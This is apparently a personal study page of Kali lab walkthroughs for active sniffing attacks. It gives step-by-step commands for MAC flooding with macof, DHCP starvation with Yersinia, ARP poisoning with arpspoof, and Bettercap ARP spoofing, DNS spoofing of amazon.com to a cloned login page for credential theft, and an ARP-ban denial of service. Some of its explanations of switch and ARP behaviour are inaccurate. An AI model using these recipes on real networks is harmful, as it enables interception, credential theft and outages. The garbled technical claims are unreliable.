<h1>Active Sniffing Techniques</h1>
<h1>Perform MAC Flooding with macof</h1>
    <p>Attackers use MAC attacks or MAC flooding to force a switch to act as a hub.</p>
    <h2>MAC address</h2>
    <p>A MAC address uniquely identifies each node of a network (Layer 2). A MAC address comprises
    48 bits, split into two sections of 24 bits. The first section contains the ID number of the 
    manufacturer (organizationally unique identifier - OUI) and the next six digits (24 bits) indicate 
    the adapter's serial number. </p>
    <h2>CAM table</h2>
    <p>A CAM table is a dynamic table of fixed size. It stores information such as MAC addresses available 
    on physical ports along with VLAN parameters associated. When a machine sends data to another machine in a 
    network, the data passes through the switch. The switch searches for the destination MAC address (in 
    Ethernet frame) in its CAM table, and one the MAC address is found, it forwards data to the machine 
    through the port with which the MAC address is bound. A CAM table refers to the dynamic form of content 
    and works with an Ethernet switch. The Ethernet switch maintains connections between ports and the CAM 
    table keeps track of MAC address locations on the switch. But the table is limited in size. 
    If the CAM table is flooded with more MAC addresses than it can hold, the switch will turn into
    a hub. The CAM table does this intentionally to ensure the delivery of data to the intended host.</p>

    <h2>What happens if a CAM table is full </h2>
    <p>When a CAM table is full, the switch broadcasts all incoming traffic to all ports, 
    similar to a hub. The MAC flooding attack also fills the CAM table of adjacent switches.</p>

    <h2>MAC Flooding</h2>
    <p>In a MAC flooding attack the attacker sends numerous fake MAC addresses to the switch.
    When the CAM table is full, any further requests may force the switch to enter fail-open mode.
    The attacker then changes the machine's NIC to promiscuous mode to enable the machine to 
    accept all the traffic entering it.</p>

    <h2>MAC flooding with macof</h2>
    <p><a target=_blank href=https://medium.com/@S3Curiosity/unleash-macof-an-essential-ethical-hacking-tool-for-network-security-a12445bc0501>macof</a>
    is a Unix/Linux tool that is part of the <a target=_blank href=https://nl.wikipedia.org/wiki/Dsniff>dsniff</a> collection. 
    It floods the local network with random MAC and IP addresses, causing some switches to fail and open in 
    repeating mode, thereby facilitating sniffing. This tool floods the switch's CAM tables (131.000 per minute) 
    by sending forged MAC entries. When the MAC table fills up and the switch converts to hub-like 
    operation, an attacker can monitor the data being broadcast.</p>

     <h2>How does it work</h2>
    <p>Three machines:</p>
    <p><ol>
        <ul>Machine A with MAC address A</ul>
        <ul>Machine B with MAC address B</ul>
        <ul>Machine C with MAC address C</ul>
    </ol></p>
    <p>Machine C is the attacker</p>
    <p>Machine C spoofs both the IP address and the MAC address of Machine B</p>
    <p>Machine C runs a sniffer in promiscuous mode</p>
    <p>Machine A wants to communicate with Machine B and sends an ARP request to the switch, containing:</p>
    <p><ol>
        <ul>IP address of Machine B</ul>
        <ul>IP address of Machine A</ul>
        <ul>MAC address of Machine A</ul>
    </ol></p>
    <p>The switch broadcasts the ARP request to all machines in the network</p?
    <p>Before Machine B can respond to the ARP request, Machine C responds to the ARP request 
        by sending an ARP reply containing the spoofed MAC and IP addresses</p>
    <p>Machine C can achieve this by launching an attack such as DoS on Machine B, which slows 
        down its response</p>
    <p>Now the ARP cache in the switch records the spoofed MAC and IP addresses</p>
    <p>The spoofed MAC address of Machine B and the port connect to Machine C and update 
        the switch's CAM table</p>
    <p>Now, a connection is established between Machine A and Machine C</p>
    <p>The system will forward all the packets directed towards Machine B to Machine C (the attacker)</p>
    
<h2>Practice with Kali</h2>
    <p><ol>
    <ul>Start Kali VM</ul>
    <ul>Start Wireshark</ul>
    <ul>Start packet capture on eth0 / wlan0</ul>
    <ul>Open a second (bridged) VM with Wireshark installed</ul>
    <ul>Start packet capture on the second VM too</ul>
    <ul>Kali machine: open terminal</ul>
    <ul>Type: sudo su</ul>
    <ul>Type: cd -> Enter</ul>
    <ul>Type: macof -i eth0 -n 10</ul>
    <ul>This command will start flooding the CAM table with random MAC addresses</ul>
    <ul>Switch to Wireshark</ul>
    <ul>Observe the <b>IPv4</b> packets from random IP addresses</ul>
    <ul>Click on any captures IPv4 packet and expand the Ethernet II node in the packet details section</ul>
    <ul>Observe the information regarding source and destination MAC addresses</ul>
    <ul>Switch to Wireshark in the second VM and compare the <b>IPv4</b> packets with the <b>IPv4</b> packets on the Kali machine</ul>
    <ul>macof has sent the packets with random MAC and IP addresses to ALL active machines in the local network</ul>
  </ol></p>

     <h1>Perform a DHCP Starvation Attack using Yersinia</h1>
    <p>A DHCP attack is an active sniffing techique used by the attacker to steal and manipulate 
    sensitive data. DHCP is a client - server protocol that provides an IP address to an IP host. 
    The DHCP server also provides configuration-related information such as the default gateway and 
    subnet mask. When a DHCP client boots up, it participates in traffic broadcasting. DHCP servers 
    maintain IP configuration in a database such as valid TCP/IP configuration parameters, valid IP 
    addresses and duration of the lease offered by the server. It provides a lease offer to the client.</p>

    <h2>DHCP Starvation Attack</h2>
    <p>In a DHCP Starvation Attack an attacker floods the DHCP server by sending numerous DHCP 
    requests and uses all of the available IP addresses that the DHCP server an issue. As a result, 
    the server cannot issue any more IP addresses, leading to a DoS attack. An attacker broadcasts 
    DHCP requests with spoofed MAC addresses with the help of tools as <a target=_blank href=https://github.com/tomac/yersinia>Yersinia</a>, 
        <a target=_blank href=https://github.com/r-richter/hyenae>Hyenae</a> and <a target=_blank href=https://gobbler.sourceforge.net/>Gobbler</a>.</p>

    <h2>Practice with Kali</h2>
    <p><ol>
    <ul>Start Kali VM</ul>
    <ul>Start Wireshark</ul>
    <ul>Start packet capture on eth0 / wlan0</ul>
    <ul>Open a second (bridged) VM with Wireshark installed</ul>
    <ul>Start packet capture on the second VM too</ul>
    <ul>Kali machine: open terminal</ul>
    <ul>Type: sudo su</ul>
    <ul>Type: cd -> Enter</ul>
    <ul>Type: sudo apt-get install yersinia</ul>
    <ul>Type: yersinia -I</ul>
    <ul>This command will start Yersinia GUI</ul>
        <ul>Press F2 to select DHCP mode</ul>
        <ul>Press x to list available attack options</ul>
        <ul>Press 1 to start DHCP starvation attack</ul>
        <ul>Yersinia starts sending DHCP packets to the network adapter and all active machines in the local network</ul>
        <ul>After a few seconds, press q to stop the attack and terminate Yersinia</ul>
    <ul>Switch to Wireshark</ul>
    <ul>Observe the <b>DHCP</b> packets</ul>
    <ul>Click on any captured DHCP packet and expand the Ethernet II node in the packet details section</ul>
    <ul>Observe the information regarding source and destination MAC addresses</ul>
    <ul>Switch to Wireshark in the second VM and compare the <b>DHCP</b> packets with the <b>DHCP</b> packets on the Kali machine</ul>
    <ul>Yersinia has sent the packets to ALL active machines in the local network</ul>
  </ol></p>

    <h1>Perform ARP Poisoning using arpspoof</h1>

    <p>The ARP is a stateless TCP/IP protocol that maps IP network addresses to the 
    hardware address used by a data link protocol. Using this protocol a user can easily 
    obtain the MAC address of any device on a network. </p>
    <h2>ARP Spoofing Attack</h2>
    <p>ARP packets can be forged to send data to the attacker's machine. ARP spoofing involves constructing a large 
    number of forged ARP requests and reply packets to overload a switch. ARP provides no means of verifying the authenticity
    of the responding device. Attackers use this flaw in ARP to create malformed ARP replies containing 
    spoofed IP and MAC addresses. Assuming it to be the legitimate ARP reply, the victim's computer blindly 
    accepts the ARP entry into its ARP table. Once the ARP table is flooded with spoofed ARP replies, the switch 
    is set in forwarding mode and the attacker intercepts all the data that flows from the victim's machine without the 
    victim being aware of the attack. This is also known as poisoning. ARP spoofing is an intermediary for 
    performing attacks such as DoS, MITM and session hijacking.</p>
    <h2>How does it work</h2>
    <p>When a legitimate user initiates a session with another user in the same layer 2 broadcast domain, 
    the switch broadcasts an ARP request using the recipient's IP address, while the sender waits for the recipient 
    to respond with a MAC address. An attacker eavesdropping on this unprotected layer 2 broadcast domain can respond 
    to the broadcast ARP request and replies to the sender by spoofing the intended recipient's IP address. The attacker 
    runs a sniffer and turns the machine's NIC adapter to promiscuous mode.</p>

       <h2>Practice with Kali</h2>
    <p><ol>
        <ul>Step 1: <b>Find the IP address of the access point / gateway </b> -> <b>IP A</b>b</ul>
        <ul>Step 2: <b>Find the IP address of the victim's computer</b> -> <b>IP B</b></ul>
        <ul>Step 3: <b>Find the IP address of your own computer</b> -> <b>IP C</b></ul>
        <ul>Step 4: <b>Start Kali VM</b> -> <b>System D</b></ul>
        <ul>Step 5: <b>Start other (bridged) VM</b> -> <b>System E</b>
    <ul>Start Wireshark on both System D and System E</ul>
    <ul>Start packet capture</ul>
    <ul>Open terminal in System D</ul>
    <ul><i>sudo su</i></ul>
            <ul><i>cd</i> Enter</ul>
    <ul><i>arpspoof -i eth0 -t [IP A] [IP B]</i> Enter</ul>
    <ul>This command tells the access point (IP A) that the target system (IP B) has OUR MAC address</ul>
    <ul>We are informing the access point that we are the target system</ul>
            <ul>In the terminal we see <i>"... IP B is-at [our MAC address]</i>"
    <ul>Looking at the packets in Wireshark we will see the alert "duplicate use of [IP B] detected"</ul>
    <ul>Switch back to the terminal window where arpspoof was running</ul>
    <ul><i>arpspoof -i eth0 -t [IP B] [IP A]</i> Enter</ul>
    <ul>This command tells the target system (IP B) that we are the access point (IP A)</ul>
    <ul>Click on any ARP packet in Wireshark and expand Ethernet II node in the packet details section</ul>                
    <ul>Observe IP A and IP B</ul>
    <ul>Using arpspoof, we assigned the MAC address of the host system (IP C) to the target system (IP B) and access point (IP A)</ul>
  </ol></p>

                <h2>Practice ARP spoof with Bettercap</h2>
                <p><a target=_blank href=https://www.bettercap.org/>Bettercap</a>, better than Ettercap!</p>
                <p><a target=_blank href=https://youtube.com/watch?v=xrK6KA9yzQE>Awesome video</a></p>
                <p>The command arp -a shows all devices in the ARP table; the ones with "Type: dynamic" are interesting (only Windows will show this, Linux not). 
                    The ones with "Type: static" can't be spoofed!</p>
                <p><ol>
                    <ul>Kali machine: start terminal</ul>
                    <ul><i>sudo apt-get install bettercap</i></ul>
                    <ul><i>sudo bettercap</i></ul>
                    <ul>When Bettercap has started, see all nodes in the network:</ul>
                    <ul><i>net.probe on</i></ul>
                    <ul>If you query the ARP table again, you can see it is now filled with details of all devices in the network</ul>
                    <ul>arp -a</ul>
                    <ul>To show all devices: <i>net.show</i></ul>
                    <ul>For the spoofing process, first type <i>help spoof</i></ul>
                    <ul>We need: <b>arp.spoof.fullduplex</b> (If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)</ul>
                    <ul><i>set arp.spoof.fullduplex true</i></ul>
                    <ul><i>set arp.spoof.targets [IP gateway],[IP target]</i></ul>
                    <ul>Now, everything is set up for the attack</ul>
                    <ul><i>arp.spoof on</i></ul>
                    <ul>In order to see details we can use:</ul>
                    <ul><i>net.sniff on</i></ul>
                    <ul>Bettercap starts to monitor the whole network</ul>
                    <ul>Now, if the user of the victim's computer visits a HTTP webpage, it shows up in the terminal</ul>
                    <ul>This is because the data flows THROUGH the Kali computer (a real MITM attack)</ul>
                    <ul>It will NOT work if the victim uses a proxy tunnel (like NordVPN) to visit internet or if he visits HTTPS webpages</ul>
                    <ul>So, the scope of this attack is limited but interesting</ul>
                </ol></p>

                <h2>Practice DNS spoof with Bettercap</h2>
                <p>We want to spoof a domain, build a clone website on own server and trick victim to visit our server instead of the real domain</p>
                <p><ol>
                    <ul><i>help dns.spoof</i></ul>
                    <ul>Start nginx on Kali system en create website in /var/www/html</ul>
                    <ul><i>service nginx start</i></ul>
                    <ul><i>set dns.spoof.domains amazon.com</i></ul>
                    <ul><i>set dns.spoof.address [IP Kali system]</i></ul>
                    <ul><i>dns.spoof on</i></ul>
                    <ul>Now, when te victim visits amazon.com he is directed to our webpages</ul>
                    <ul>Here, we can trick the victim to log in and gives us the credentials etc.</ul>
                    <ul>It only works for the victim pc, so first we had to do these steps:</ul>
                    <ul><i>set arp.spoof.fullduplex true</i></ul>
                    <ul><i>set arp.spoof.targets [IP gateway],[IP target]</i></ul>
                    <ul>Don't forget to <i>dns.spoof off</i></ul>
                </ol></p>

                <h2>Practice DNS ban (DoS) with Bettercap</h2>
                <p><ol>
                    <ul><i>set arp.spoof.fullduplex true</i></ul>

                    <ul><i>arp.ban on</i></ul>
                    <ul>With this command we do a succesful DoS on the victim pc, if he wants to visit a website, it is not possible because of the ARP ban</ul>
                </ol></p>
